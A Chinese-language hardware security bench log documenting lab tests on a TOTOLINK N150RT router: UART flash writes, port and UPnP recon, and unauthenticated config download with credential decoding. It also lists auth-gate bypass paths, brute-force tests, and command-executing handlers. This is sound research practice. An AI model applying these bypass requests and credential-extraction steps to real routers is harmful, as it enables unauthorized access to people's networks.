# 實機場次紀錄

> **只追加。** 既有段落不修改 —— 一場做完就定版。
> (本節是標頭,不是場次紀錄,所以它會隨規則變動;變動記在最新那一場裡。)

## ⚠️ 這份檔案要配合 [`test-ledger.md`](test-ledger.md) 一起看

**單獨讀這一份會誤解。** 本檔是**過程**:某一天實際打了什麼指令、實際看到什麼
回應、以及當場發現自己哪裡做錯了。它**不是判定**。

| 你想知道 | 去讀 |
|---|---|
| 「這個專案主張什麼,憑什麼,以及什麼情況下它會是錯的」 | **[`test-ledger.md`](test-ledger.md)** —— 130 項的預測、**事先凍結的反證條件**、判定、證據連結 |
| 「那天到底發生了什麼」 | **本檔** |
| 「怎麼自己跑一次」 | [`RUNBOOK.md` §8.12](RUNBOOK.md) |

**兩者的關係是有方向的**:登記簿的每一列判定,證據欄指回本檔的某一段逐字紀錄;
本檔的每一張紀錄卡,都對照它所屬那一項**在測試之前就寫好**的反證條件。
**先寫反證條件、再送封包**,而 append-only + git 讓「寫在前面」可以被 diff 證明 ——
這是這個 repo 唯一一件不肯妥協的事。**沒有事先寫下失敗長什麼樣的測試,事後一定
會被讀成成功。**

## 這份檔案擁有什麼

| 檔案 | 擁有 |
|---|---|
| [`RUNBOOK.md` §8.12](RUNBOOK.md) | **程序** —— 可組合的小節,跨週共用,會被精煉 |
| **本檔** | **每一場實際跑了什麼** —— 計畫(動手前寫的)、紀錄卡、逐字節錄、燒掉了什麼 |
| [`test-cases.toml`](test-cases.toml) → [`test-ledger.md`](test-ledger.md) | 單項的預測 / 反證 / 判定 / 證據連結。**登記簿是來源,ledger 是生成的** |
| [`PROGRESS.md`](PROGRESS.md) | gate、週、carried-forward |
| [`docs/disclosure.md`](docs/disclosure.md) | 每一個發現的揭露狀態 |
| `$FWRE_WORK/dumps/` | 原始 transcript、pcap、JSON。**不進 repo** |

**因為本檔是逐字的,§8.12 可以自由精煉** —— 證據站在這裡,不站在程序文件上。
今天一場就找出四個程序缺陷(`FLW` 的預期回應字樣、寫死的 `eth1`、讀回重用 RAM
位址、繞過測試打在豁免頁上),**每一個都是跑了才知道的**;程序改掉了,而這裡
記的仍然是當時實際打了什麼、實際看到什麼。

**per-unit 識別碼(MAC、SSID、`config.dat` 內容、射頻校準值)不寫進來** ——
跟 W02 把 PCB 條碼塗掉是同一條規則。

**每一場的格式**:計畫 → 紀錄卡 → 實測結果 → 燒掉了什麼 → 下一場從哪裡開始。
**計畫寫在動手之前**,而 append-only + git 讓「寫在前面」這件事可以被 diff 證明。

## 一張紀錄卡長什麼樣（每項一張）

**這個模板在 2026-08-17 夜之前不在任何 committed 檔案裡,而那是它漂掉的原因。**
它原本只寫在 `plan/Redteam_Testing_playbook.md` §1.4,而 `plan/` 是 gitignored、
且規則明訂不得引用進 committed 檔案 —— 所以**這份檔案該遵守的格式,住在一個
這份檔案不准引用的地方**。W05 照做是因為那份手冊剛整理完還在手邊;W06 第一版
寫成了敘事段落,九張裡有六張沒有反證欄。**沒有擁有者也沒有檢查器的規則,
只會撐到寫它的人還記得為止。** 現在擁有者是這一段,檢查器是
[`tools/check-benchlog.py`](tools/check-benchlog.py),而它在 `make ci` 裡。

```text
T-xx  <登記簿編號> <項目>                             日期時間:
可行性: ★    驗證狀態(測前):        依據:
送出（逐字，含完整 URL 與 body）:

原始回應（狀態碼 + header + 前 200 bytes）:

觀測通道 1（例：GET /k 的內容）:
觀測通道 2（例：tcpdump 的 ICMP/DNS）:
UART console 當下輸出:

判定:  ✅成立 / ❌不成立 / 🔶部分 / ⚠️不確定（說明為什麼）
反證檢查: 測前寫下「看到 ___ 就是不成立」，實際看到 ___
這一步燒掉了什麼:
驗證狀態(測後):        下一步:
```

**「反證檢查」不能空白。** 沒有事先定義失敗長什麼樣的測試,事後一定會被解讀成成功 ——
**而那句話由 `check-benchlog.py` 機械執行,不是靠自律。**

> ⚠️ **檢查器上線時,舊卡片裡有三張過不了,而它們不能改。**
> 本檔只追加,過去那一場的卡片是**證據**不是文件。所以豁免寫在這裡、附理由,
> 而檢查器從這裡讀 —— **檢查器自己帶一張豁免清單,就是同一份狀態的第二個擁有者**。
>
> <!-- benchlog-exempt: T-07 W05 下午場的 POST 前快照卡。判定欄裡寫了它同時是一個
> 對照組(8/16 之後開機三次、跑過 GET 輪、登入過一次,設定區一個 byte 都沒變),
> 但沒有獨立的反證欄。本檔只追加,所以它留在原地。 -->
>
> <!-- benchlog-exempt: T-08 W05 下午場的 IoC 預檢卡。判定欄引的是**成功**條件
> (「凍結條件 4 / 343 MET」)而不是反證條件 —— 那兩個不一樣:一個說「對了長這樣」,
> 一個說「錯了長這樣」。本檔只追加,所以它留在原地。 -->
>
> <!-- benchlog-exempt: T-14 W05 下午場的 POST 後快照卡。它沒有判定欄也沒有反證欄:
> 判定與歸因寫在卡片下方的散文裡(19/23 欄位、COMPDS 被覆蓋),而那正是這支檢查器
> 存在的理由 —— 一張卡片的結論散進散文,就沒有人能機械檢查它事先寫過什麼。
> 本檔只追加,所以它留在原地;它是這支檢查器的第一個發現,不是它的例外。 -->
>
> 🔴 **這三張是分兩次被抓到的,而那個過程本身值得記。**
> 檢查器第一版把「一個程式碼區塊」當成「一張卡片」,而 W05 把 `T-01`–`T-05`
> 寫在同一個區塊裡 —— 於是它回報「19 張卡片,每一張都有反證檢查」,
> **而實際上檔案裡有 30 張,區塊裡第一行之後的全部是隱形的。**
> 修好之後從 1 張變成 3 張。
>
> **一支宣稱涵蓋全部、實際上只看了一部分的檢查器,正是本檔記了 27 次的那種缺陷** ——
> 而它在自己的第一次執行就成為其中一個。
>
> 那三張是 2026-08-17 下午寫的,缺漏到當天夜裡寫出檢查器才被發現。
> **一天。這就是「靠記得」的保存期限。**

> 🔴 **一條例外,而它是兩條規則正面相撞的結果,裁決於 2026-08-17 夜。**
> 「送出（逐字）」這一欄要求把完整請求寫下來;
> [`docs/disclosure.md`](docs/disclosure.md) 禁止把**未通報**項目的可複製請求
> 寫進 committed 檔案。**揭露規則優先。**
>
> 未通報項目的卡片,「送出」欄寫:
> **`逐字內容依 docs/disclosure.md 保留;handler 與參數見 test-ledger.md 的 Pxx`**
>
> 其餘每一欄照填 —— **判定、反證檢查、燒掉了什麼都不受影響**,
> 因為那三欄記的是「發生了什麼」不是「怎麼重做」。
> 已公開的項目（有 CVE 編號、且已公開）**照原樣寫逐字請求**。

---

# 2026-08-17 — W05 Phase 0–3

**跑了 §8.12.1 → 8.12.2 → 8.12.3 → §8.9(`FLW` 演練)→ 8.12.4 → 8.12.5 →
8.12.6 → 8.12.7 → 8.12.8。**
成果:**G3.5 通過、G3.75 通過、登記簿 22/31**。

## 這一場的計畫(動手之前寫的)

| 目標 | 事先寫下的成功條件 |
|---|---|
| `P0-2` console 常駐 | 38400 8N1 全程可擷取,無亂碼 |
| `P0-10` 64 KiB 快照 | 與 8/16 完整 dump 的前 64 KiB 逐 byte 相同 |
| `P0-5` IoC 預檢 | **差異維持在 4 / 343**,且 19412/31412/48101/2323/60001 全無回應 |
| **`P0-3` `FLW` 演練** | 讀回與寫入一致,**抹除後回到全 FF**。不成立就不准往下 |
| `P1-1` LAN | **10.1.1.1/24**,DHCP 派 10.1.1.10–254 |
| `P1-2` / `P6-11` | 80 開;**22、23 都關**;5555 關 |
| `P1-10` UPnP | **1900 有回應**,而且要看清楚是 `miniigd` 還是 `mini_upnpd` |
| `P2-1` 閘門 | 只在 URI 含 `.htm` / `.asp` 時跑授權 |
| `P2-2` 豁免注入 | 13 個不錨定 `strstr` → 塞進路徑任一處**可能繞過** |
| `P2-7` session | 這台沒有 session,只有 `0x004899d8` 一個全域 |
| `P2-8` 憑證 | `admin`/`admin` 明文,**無帳號鎖定** |

**兩個 gate 的前置(不准跳過)**:`P0-3` 沒過不准開始 Phase 3;
G3.75 五格沒滿不准送第一個封包。

---

## 紀錄卡

```
T-01  P0-2   UART console 常駐                        07:31
      抓到 bootloader: 一次上電命中,300 秒 window
      banner: ---RealTek(RTL8196E)at 2014.04.22-16:22+0800 v1.3 [16bit](400MHz)
      log: dumps/w05-console-20260817-0731.log
      判定: ✅ 成立
      反證檢查: 測前寫「console 出現亂碼、斷線或不吐訊息 → 供電/接地問題」
                實際: 乾淨的 <RealTek>,`?` 完整印出 16 條指令,全程無亂碼

T-02  P0-10  64 KiB 設定區快照                        07:33
      檔名: dumps/config-region-20260817-0733.bin      大小: 65,536
      與 8/16 完整 dump 的 cmp: **IDENTICAL**
      判定: 🔶 部分
      反證檢查: 測前寫「送出已知會寫設定的請求後兩份快照差異是 0 → 範圍選錯」
                實際: 本場未送任何寫入請求,此為基準快照。範圍正確性待 W06

T-03  P0-5   IoC 預檢                                 07:35 / 08:43
      COMPCS vs COMPDS: **4 / 343**(測前寫的成功條件: 4)
        CHECK_SSID_OK · DHCP_LEASE_TIME · MIB_VER · WLAN_SSIDS
      兩區 checksum_ok = True,verdict = consistent
      IoC 埠 2323/5555/9034/19412/31412/48101/60001/7547: **全部 closed**
      判定: ✅ 成立(兩半都完成)
      反證檢查: 測前寫「第 5 筆差異,或任一埠有回應 → 資安事件,測試中止」
                實際: 沒有第 5 筆,沒有任何一個埠回應

T-04  P0-3   FLW 回復路徑演練                          07:38–07:47
      Step 1  0x3F0000 起 256 bytes: **整片 ff**
      Step 2  EB 一次吃 8 個 byte: **可以**(§8.9 把這列為「沒有被實測過」)
      Step 3  FLW 回應(逐字):
              Write 0x00000008 Bytes to SPI flash#1, offset 0x003f0000<0xbd3f0000>,
              from RAM 0x80530000 to 0x80530008
              (Y)es, (N)o->Y
              .
              → **不是「Flash Write Successed!」,是一個句點**
      Step 4  讀回(新位址 80540000): de ad be ef de ad be ef —— 與寫入一致
      Step 5  同磁區 0x3F0100 寫入後回讀 0x3F0000: de ad be ef …
              ⚠️ **讀回用了 Step 4 已用過的位址 —— 本場的設計缺陷,結果不可採信**
      Step 6  寫 FF 到 0x3F0000,讀回(新位址 80550000): **ff ff ff ff ff ff ff ff**
      判定: ✅ 成立(對照它事先凍結的那一句)
      反證檢查: 測前寫「讀回與寫入不一致,或抹除後不是全 FF → 救援路徑不成立」
                實際: 讀回一致(Step 4),抹除後全 FF(Step 6)。兩個條件都滿足
      燒掉了什麼: 0x3F0000 與 0x3F0100 各 8 bytes 被寫過又被抹回。
                  該區在 W02 完整 dump 中確認為已抹除區,無任何東西讀它
      下一步: FLW 的磁區語意未決 —— RUNBOOK §8.9.3 / §8.9.4,四行指令

T-05  P1-1   找到真實 LAN IP                            08:15 / 08:41
      Windows 側網路卡從這台的 DHCP 拿到 10.1.1.10/24(PrefixOrigin: Dhcp)
      直連之後 nmap broadcast-dhcp-discover: **IP Offered 10.1.1.11**,
        Server Identifier 10.1.1.1,lease 8h,Domain Name TOTOLINK
      ping 10.1.1.1 → 3/3
      判定: ✅ 成立
      反證檢查: 測前寫「DHCP 沒派到 10.1.1.0/24,或 10.1.1.1 不回應 → compcs 要重驗」
                實際: 派到池子的第一、二個位址,10.1.1.1 回應。COMPCS 的解碼經得起這一測
      ⚠️ 這一測同時暴露:**回應 TTL 是 63 不是 64** —— 網路卡起在 Windows 側,
         WSL 是繞過去的。修正見「這一場的四個程序缺陷」第 2 條
```

---

## 實測結果

### R1 `P0-4` 隔離 —— 帶對照組的那一次才算

第一次抓 45 秒得到**零封包**,而零在鏈路未經證實之前不是證據。
ARP 有回應之後重抓,主動製造已知流量:

```
packets: 16                    ← 對照組,必須 > 0
      8  fc:19:28:61:84:c9     （我們）
      8  14:4d:67:2e:01:ec     （裝置）
DNS / 對外 HTTP: 無
```

**剛好兩個 MAC。** Windows 側確認已無 `10.1.1.x` 位址。

### R2 `P1-2` / `P6-11` 埠 —— 點名的每一項都對,而它點名得太少

```
80/tcp  open   ·  52869/tcp  open  ★  ·  52881/tcp  open  ★
Not shown: 65532 closed tcp ports (reset)
53/udp · 67/udp · 1900/udp  open|filtered  ·  161/udp closed
```

四次對照組(掃描前 / TCP 後 / UDP 後 / 最後)全部 200,所以 `closed` 是真的。
**52869 與 52881 不在任何一條預測裡。**

### R3 `P1-10` UPnP —— banner 說的和 binary 說的不一樣

```
Server: miniupnpd/1.4 UPnP/1.4
Location: http://10.1.1.1:52869/picsdesc.xml
USN: uuid:12342409-1234-1234-5678-ee1234cc5678
```

**rootfs 裡只有 `/bin/miniigd`(97,100 bytes);`mini_upnpd` / `miniupnpd`
這兩個 binary 不存在**,而 `strings /bin/miniigd` 逐字含有
`Server: miniupnpd/1.4 UPnP/1.4`、`MiniIGD %s (%s).`、`/etc/miniigd.conf`。

- **52869 = `miniigd`**。`GET /picsdesc.xml` → 200 / 2,933 B,暴露
  `WANIPConnection:1`、`WANCommonInterfaceConfig:1`,外加一個出貨時忘了拔的
  `urn:schemas-dummy-com:service:Dummy:1`(控制 URL `/dummy`)。
  `UDN` / `serialNumber` 是樣板常數,每台相同。
- **52881 = `wscd`**。`GET /simplecfg.xml` → 200 / 1,130 B;rootfs 的
  `/etc/simplecfgservice.xml` 有 `GetDeviceInfo` 與 **`PutMessage`** ——
  CVE-2021-35392/35393 的那個面。**`P6-3` 的反證條件是「`wscd` 沒在跑就收掉」,
  它在跑,所以那條留著(W07)。**
- 線上 `picsdesc.xml`(2,933 B)與 rootfs 的 `/etc/tmp/picsdesc.xml`(2,941 B)
  只差在 `<presentationURL>` 被填了 IP。

> ⚠️ **只做偵察。** 52869 是 CVE-2014-8361 的埠(CISA KEV,有公開武器化程式碼)。
> **沒有呼叫任何 SOAP action。**

### R4 `/config.dat` —— 而它關掉 W02 開放 #11

```
GET /config.dat  →  200, 7,490 bytes, body 開頭 "COMPCS"

served sha256 : e09cbf8428aa15944ed75939e79820c5...
flash@0xC000  : e09cbf8428aa15944ed75939e79820c5...
identical     : True
```

1. **CVE-2019-19822 端到端**,而 `fwrecon compcs` 解那份 blob 得到明文密碼
   (CVE-2019-19823),那組密碼在 R6 直接通過認證。
2. **第二個獨立儀器讀到這顆 flash**:`boa` 經 kernel MTD 驅動、走乙太網路;
   W02 經 bootloader SPI 常式、走 UART。**兩條不共用程式碼的路徑,同一組 bytes。**
   範圍是 `0xC000`–`0xD142`,不是整顆。

### R5 閘門的實際涵蓋範圍 —— 靜態讀法是對的

**76 個出貨的 `.htm`,7 個未認證可取,69 個 302 → `login.htm`:**
`status`(30,447 B)· `Connect_status` · `login` · `countDownPage` ·
`countDownPageWizard` · `index` · `wan_status`。

**兩個 302 目標就是閘門的指紋**:不存在的 `.htm` → `login.htm`(門跑了);
不存在的其他路徑 → `home.htm`(門沒跑)。

**`P2-2` 反證成立** —— 十二種豁免字串注入全部失敗:

```
/password.htm?login=1          302 → login.htm
/login.htm/../password.htm     302 → login.htm
/status.htm/../password.htm    302 → login.htm
/loginpassword.htm             302 → login.htm
/password.htmlogin.htm         404
/login.htm/password.htm        400
```

豁免比對**有錨定或有長度限制**,不是天真的整串 `strstr`。**X-3 不成立。**

**`P2-3` 確認,而且被示範出來**:

```
/config.dat        200  7,490B        ← 沒門
/config.dat.htm    302 → login.htm    ★ 加副檔名把它推進門裡
/password.HTM      302 → home.htm     ← 大小寫不匹配:門不跑,檔案也找不到
/password.htm%00   400
```

十三種正規化變形,沒有一種讓被擋的頁面吐出內容。

**`P2-4` 反證成立**:`Host` 任意值 / 空值、`X-Forwarded-For`、`Referer`、
`Authorization: Basic admin:admin` —— 五個都回同一個 30,447 B 頁面。
**`check_host` 不在授權路徑上**,`P8-5` 的 DNS rebinding 前提成立(W07)。

### R6 `P2-8` / `P2-7` 憑證與 session

```
不帶憑證                                302 → login.htm
admin:admin（從 COMPCS 解出來的）        200   5,332B   ★
admin:wrongpassword                     302 → login.htm
50 次連續錯誤 → 50 次全部拒絕
第 51 次用正確密碼                       200            ← 無鎖定、無失敗計數
成功之後,同一 IP 不帶憑證再送一次        302 → login.htm ★
.101 不帶憑證 / .100 不帶憑證            302 / 302
formLogin POST                          一個 cookie 都沒設
任何回應                                從來不送 Set-Cookie
```

`admin:admin` 也開啟 `tcpiplan` / `upload` / `syslog` / `saveconf` /
`wlsecurity`(全部 200)。

**這個 build 沒有 session。** 不是 2015 的 `AUTHG_IP_ADDR`、不是 2020 的五格表、
**也不是 `0x004899d8` 那個全域**(它不授權任何東西)。授權是**每個請求各自的
HTTP Basic**。`PROGRESS.md` 開放 #9 的問法要改。

> 推論一條:**沒有 session ≠ 沒有 CSRF** —— 瀏覽器會自動重送快取的 Basic 憑證。

### R7 `P1-5` —— 57 還是 60,答案是「至少 58」

57 個 `root_form[]` 端點的 GET **全部 302 / 131B → `home.htm`**,
與不存在的名字**無法區分**(GET 走不到 `handleForm`)。但:

| 名字 | GET 回應 |
|---|---|
| **`formOpdRedirect`** | **302 / 535B → `/opmode1.htm`** |
| **`formWanRedirect`** | **302 / 536B** |
| `formWlanRedirect2` | 302 / 131B(與其他無異) |

兩個回應與所有其他路徑都不同 → **它們是真的端點,而 Ghidra 讀出來的 57 筆不含它們。**
`ghidra-formtable-unit-2018.json` 記錄 `/boafrm/` 這個前綴字串**被八個函式引用**,
只有一個是 `handleForm`。

### R8 網路上看得到的版本字串對不上 CVE 的

| 在哪 | 字串 |
|---|---|
| `/etc/version`(rootfs 唯一一個) | `TOTOLINK-`**`CX`**`-N150RT-V2.1.6-B20171121.1002` |
| `/bin/boa` · `/bin/sysconf` | `TOTOLINK-N150RT-V2.1.6-B20171121.1002` |
| **未認證的 `status.htm`** | `TOTOLINK-N150RT-V2.1.6-B20171121.1002` |
| CVE-2024-51228 點名 | `TOTOLINK-`**`CX`**`-N150RT V2.1.6-B20171121.1002` |

**帶 `CX` 的只有 `/etc/version`,而網頁介面不用它。**
`status.htm` 同時未認證吐出 3 個 MAC、LAN 位址與遮罩、SSID、頻道、加密方式、
連線客戶端與 WAN 狀態。**是否已有前人研究涵蓋,未查證,不主張新穎性。**

---

## 這一場的四個程序缺陷(都是跑了才知道的)

1. **`RUNBOOK §8.9` 的預期回應字樣是錯的。** `FLW` 回一個句點 `.`,不是
   `Flash Write Successed!`;而且 `FLW` 的 Y 提示(`(Y)es, (N)o->`)與 `FLR` 的
   (`(Y)es , (N)o ? -->`)標點不同。→ 更正在 §8.9.2。
2. **作業單寫死 `eth1`。** WSL 用 MAC 衍生的可預測命名(`enx…`),所以
   `Cannot find device "eth1"` 與 `ping` 成功**同時為真** —— 封包繞經 Windows,
   唯一破綻是 `ttl=63`。→ §8.12.4,而且 `bench-probe` 現在自己從
   `/proc/net/route` 判定並拒絕跑 `ssdp`。
3. **`FLW` 演練 Step 5 的讀回重用了 Step 4 的 RAM 位址。** §8.7.8 早就用名字
   警告過。→ 改良版在 §8.9.4。
4. **繞過測試第一輪全打在 `/status.htm` 上,而它在豁免清單上。** 拿沒鎖的門測
   開鎖技巧。→ §8.12.7 的警告。

**另外兩件不是程序缺陷,是我自己的:**

- **在 G3.75 還是 3/5 的時候送了第一個 HTTP 請求**,為了驗證剛寫好的路由判斷,
  沒有先看板子。→ `PROGRESS.md § A process failure`。
- **拒絕從「輸出跟預期一模一樣」填紀錄卡。** Step 5 / 6 各寫了兩種正確結果,
  所以那句話對那兩格沒有定義;改成讀 picocom 的 `--logfile`,而讀完就發現
  Step 5 與 Step 6 在 NOR flash 物理上互相矛盾。

---

## 這一場燒掉了什麼

| | |
|---|---|
| flash 寫入 | `0x3F0000` 與 `0x3F0100` 各 8 bytes,寫過又抹回。該區 W02 完整 dump 確認為已抹除區 |
| 裝置設定 | **零** —— 沒有送出任何 POST 到 form handler |
| 不可逆 | 無。`0x3F0000` 已回到全 FF |

---

## 下一場從哪裡開始

**W05 = DoD 4/5、登記簿 22/31。** 剩下九項:

| 類別 | 項目 | 要什麼 |
|---|---|---|
| **W06 的,不准提前** | `P3-1` `P3-2` `P3-3` | 計畫 §五:「本週不做正式 PoC」 |
| **破壞性,要等** | `P9-9` reset | 它會用 `COMPDS` 蓋掉 `COMPCS`,毀掉 4/343 那份證據 |
| console + 冷開機 | `P9-1` `P9-3` `P1-12` | `P9-1`(`init=/bin/sh`)回報最高:一個 shell 一次解掉 `/proc/cpuinfo`(W02 開放 #6)、`ps`、以及 `flash test-csconf` 判什麼叫無效(開放 #19) |
| 要 POST | `P1-4` `P3-13` | 前後各跑一次 §8.12.3 |

**還懸著的一件事**:`FLW` 的磁區語意,四行指令,§8.9.4。
**W06 非知道不可** —— `HW_WLAN0_WSC_PIN` 在 `0x648a`,住在 `H601` 那個磁區裡。

**開工順序**:`make todo WEEK=W05` → §8.12.1 → §8.12.4(注意 `usbipd attach`
不會活過 WSL 重啟)→ §8.12.3 → 然後才是新項目。

---

# 2026-08-17（下午） — W05 收尾場

**跑 §8.12.1 → 8.12.2 → §8.9.3 → 8.12.3 → 8.12.10 → 8.12.11 → 8.12.9 →
8.12.4 → 8.12.5 → 8.12.12 → 8.12.7 → 8.12.3 → 8.12.8。**
目標：**把 W05 剩下的五項打完，並把四項排錯週的移到它們該去的週。**

## 這一場之前，桌面上先做完的事（不碰裝置）

**上午那一場留下一個判斷：`P9-1`（`init=/bin/sh`）「回報最高」。**
下午上機前先查了它的機制，結果是 —— **它沒有機制，而且這件事查得出來，不必燒開機循環。**

| 查了什麼 | 結果 |
|---|---|
| bootloader 的 `?` 有沒有漏印指令 | **沒有。** 16 條全部對得上 binary 自己的字串表 |
| loader 裡有沒有 cmdline / 環境變數 | **13 個針，0 命中**；同一次掃描找到全部 17 個已知指令 |
| flash 裡有沒有可改的 cmdline 明文 | **整顆 4 MiB 沒有。** 它在 `cr6c` 的 LZMA 酬載裡 |

**而查得到的原因本身是這一場最大的一個更正：整顆 dump 裡沒有任何一個
bootloader 字串是明文的。** `0x0012F0` 起是 LZMA，17,334 → 56,592 bytes，
指令直譯器整個在裡面。工具：`tools/loader-unpack.py`（`make loader-report`），
它在 17 個指令沒找齊時拒絕出報告。詳見 `RUNBOOK.md` §8.9.2 的方框。

## 這一場的計畫（動手之前寫的）

| 目標 | 事先寫下的成功條件 |
|---|---|
| **開放 #17** `FLW` 磁區語意 | `DB 80560000 8` / `FLR 80560000 3F0100 8` / `Y` / `DB 80560000 8`。**`ca fe ba be` → 讀-改-抹-寫回；`ff ff` → 整磁區抹掉，寫 flash 風險全部上調** |
| `P0-10` 快照 | 與 8/16 完整 dump 的前 64 KiB 相同（POST 之前那一份） |
| `P0-5` IoC 預檢 | **POST 之前**維持 4 / 343；IoC 埠全 closed |
| `P9-1` cmdline | `Kernel command line:` 印出來的**沒有多任何東西** → 與靜態那側一致，**判 refuted** |
| `P9-3` 救援 | `AUTOBURN: 0` 先送並回 `AutoBurning=0`；`IPCONFIG:10.1.1.1` 後主機 `ping` 有回應，且 `ip neigh` 的 MAC 是這台 |
| `P1-12` 開機時間 | console 第一行時間戳到 HTTP 第一個 200，**< 40 秒** |
| `P1-4` 端點 | 57 + 3 + 4 個名字全部 POST（**扣掉拒絕清單**），非 404，且對照組全程 200 |
| `P3-13` 寫入端點 | 寫入類 handler 與讀取類一樣在門外（gate 只看 `.htm`/`.asp`） |

## 這一場事先決定、而且要被 diff 證明是事先決定的三件事

**1. POST 掃描一定會改設定，所以基準改用「歸因」而不是「守住」。**
IoC 預檢凍結的條件是 4 / 343。POST 之後那個數字會變，而且**應該**變。
所以前後各一份 64 KiB 快照，差異逐欄位歸因到哪一輪，新數字成為新基準。
守住只證明沒動到；歸因證明了動了什麼、被誰動的。

**2. 有一份拒絕清單，寫在打之前。**
`reports/ghidra-sinks-unit-2018.json`：57 個 handler 裡 23 個呼叫 `system()`、
13 個 `execl()`。不打的是 `formTcpipSetup` / `formWanTcpipSetup` / `formVlan`
（會失去這台，而且後面每個端點都變偽陰性）、`formPasswordSetup`（會毀掉
CVE-2019-19823 的端到端鏈）、`formUpload` / `formUploadConfig`、
`formOpMode*` / `formWizard` / `formReboot*`。理由逐條在 `RUNBOOK.md` §8.12.12。

**3. `P9-3` 只做到「進得去」為止。** 它凍結的反證條件只問這個，沒有要求上傳。
`AUTOBURN: 0` 在 `IPCONFIG` 之前送，順序不可換。

## 這一場明確不做的

| | 為什麼 |
|---|---|
| `P3-1` / `P3-2` / `P3-3` 開火 | 計畫 §五：本週不做正式 PoC。**登記簿的 `week` 改成 W06**，理由入案 |
| `P9-9` reset | 破壞性。**改成 W07**，理由入案 |
| TFTP 上傳任何檔案 | §8.12.11 的上限 |
| 呼叫任何 UPnP SOAP action | 與上午同一條 |

## 上機之前多出來的一條預測（Ghidra，寫在送出之前）

跑 `BoaXref` 追 `formOpdRedirect` / `formWanRedirect` / `formWlanRedirect2`
（外加一個不存在的名字當負對照組）之後，掉出兩件不在計畫裡的事。

**① 開放 #23 有答案了。** 那三個名字**不是** `handleForm` 的 handler：

| | |
|---|---|
| 引用者 | `init_get` (`0x00407b7c`) 與 `process_header_end` (`0x0040bb1c`) |
| `init_get` 的字串 | `formWlanRedirect` · `formWanRedirect` · `tcpipwan.htm` · `formOpdRedirect` · `opmode1.htm` · `redirect-url=` · `&wlan_id=` |
| `formWlanRedirect2` | **unresolved —— 沒有任何函式引用它**。字串在 `.rodata` 裡，但是死的 |

所以 `root_form[]` 的 57 不是錯的，**它對 `handleForm` 是完整的**；另有一條更早的
路徑在 `init_get` 裡特判三個 `*Redirect`。而 `formWlanRedirect2` 早上實測「與不存在
的名字無法區分」——**三個來源一致：字串在、無人引用、裝置當它不存在。**

**② 早上關於閘門的結論是錯的，而這裡有一條可以否證新說法的測試。**

`process_header_end` 引用 10 個 `.htm` 名字，其中 **5 個 (`notice` `notice_frame`
`iLogin` `iReboot` `iLink`) 根本不在出貨的 143 檔裡**。若比對是**未錨定子字串**，
`status.htm` 會同時豁免 `wan_status.htm` 與 `Connect_status.htm`：

```
模型預測豁免 : Connect_status countDownPage countDownPageWizard index login status wan_status
早上實測豁免 : Connect_status countDownPage countDownPageWizard index login status wan_status
差集（兩向） : 空
```

**76 個出貨的 `.htm`，7 豁免 / 69 擋，逐一相符。**
早上寫的「comparison is anchored or length-limited somewhere」不成立。
十二種形狀失敗的真正原因是**路徑在閘門看到之前就被正規化了** ——
`/login.htm/../password.htm` 到那時候已經是 `/password.htm`，子字串沒了。

> ⚠️ **但以上是拿模型去配已有的資料。** 下面兩條是它沒看過的，任一條都能殺死它：
>
> | 請求 | 模型預測 | 反證 |
> |---|---|---|
> | `GET /zzqq.htm`（不存在，無豁免子字串） | `302 → login.htm`（門跑了） | 回 `home.htm` → 門根本沒在跑 |
> | `GET /zzqq_status.htm`（不存在，含 `status.htm`） | `302 → home.htm`（豁免） | **回 `login.htm` → 模型死，早上的讀法成立** |

**③ 而閘門也點名了五個 `/boafrm/` 端點** —— `formUpload`、`formUploadConfig`
以及三個 `*Redirect`。**`P3-13` 的預測點名的三個裡有兩個就在這張表上。**
所以本場對 `P3-13` 的問題比登記時更尖銳：不是「寫入類在不在門外」，而是
**「閘門為什麼特地點名這兩個」**。用 GET 探（不執行 handler）。

## 紀錄卡

```
T-06  開放#17  FLW 的磁區語意                            11:00
      指令: console-dump.py dump --at-prompt --flash 0x3F0100 --length 8
                              --ram 0x80560000 --chunk 8
      對照組: FLR flash 0x000000 -> 0x80560000, 期望 0b f0 00 04 -> 命中
      讀出:  cafe babe cafe babe
      判定: ✅ 讀-改-抹-寫回,而且**保留磁區其餘內容**
      反證檢查: 測前寫「ca fe ba be → 讀-改-抹-寫回;ff ff → 整磁區抹掉,
                寫 flash 風險全部上調」。前者成立
      ⚠️ 為什麼這次的證據比 07:47 那次硬: 對照組先把 flash 0x0 讀進**同一個**
         RAM 位址,所以真正讀取之前那塊 RAM 裝的是第三種東西 ——
         「換一個沒用過的位址」還是不知道裡面是什麼,這個知道

T-07  P0-10   64 KiB 快照(POST 之前)                    11:02
      檔名: dumps/config-region-20260817-1102-pre.bin   sha256 78186d2b…
      與 8/16 完整 dump 前 64 KiB: **IDENTICAL**
      判定: ✅ 而且它同時是一個對照組 ——
            8/16 之後這台開機至少三次、跑過完整 GET 輪、成功登入過一次,
            設定區**一個 byte 都沒變**。所以稍後 POST 造成的差異可以歸因

T-08  P0-5    IoC 預檢                                   11:03
      COMPCS / COMPDS 各 344 筆,共同 343 筆
      差異: 4 —— CHECK_SSID_OK · DHCP_LEASE_TIME · MIB_VER · WLAN_SSIDS
      兩區 checksum_ok=True, ring_fill_agrees=True, verdict=consistent
      判定: ✅ 凍結條件「4 / 343」MET,四個名字與 07:35 那次相同

T-09  P9-3    救援路徑(非破壞性上限)                    11:05
      AUTOBURN: 0        -> Unknown command !
      AUTOBURN 0         -> AutoBurning=0            ★ 空格才是語法
      IPCONFIG:10.1.1.1  -> Unknown command !
      IPCONFIG 10.1.1.1  -> Now your Target IP is 10.1.1.1
      主機端: ping 4 送 0 收;ip neigh = REACHABLE;rx_packets 0 -> 1
      TFTP RRQ(不存在的檔名) -> **516 bytes DATA (opcode 3) from :2098**
      判定: 🔶 部分 —— 救援進得去、網路活著、TFTP 服務會回應;
            但預測寫的是「tftp **put** 可用」,而 put 依這一場的上限不做
      反證檢查: 凍結條件只問「救援模式進不進得去」。進得去,不成立
      ⚠️ 我自己寫在計畫裡的成功條件是「ping 有回應,且 MAC 是這台」——
         **兩半都不成立,而那是我的條件寫錯了**:TFTP-only 的堆疊沒有義務
         實作 ICMP,而 loader 的 MAC 是從 IP 合成的(0a 01 01 01 = 10.1.1.1)。
         凍結的那一條沒有要求這些
      計畫外: TFTP GET 不看檔名,吐的 516 bytes 與 flash 0x060010 起的
              cr6c 酬載逐 byte 相同。列為開放題,本週不追

T-10  P1-12   上電到 web 可服務                          11:11
      工具: tools/coldboot-timing.sh(一次上電同時餵三項)
      +0.00  第一個 console 字元          +6.91  Uncompressing Linux... done
      +0.61  ---RealTek(RTL8196E) v1.3    +14.02 init started: BusyBox v1.13.4
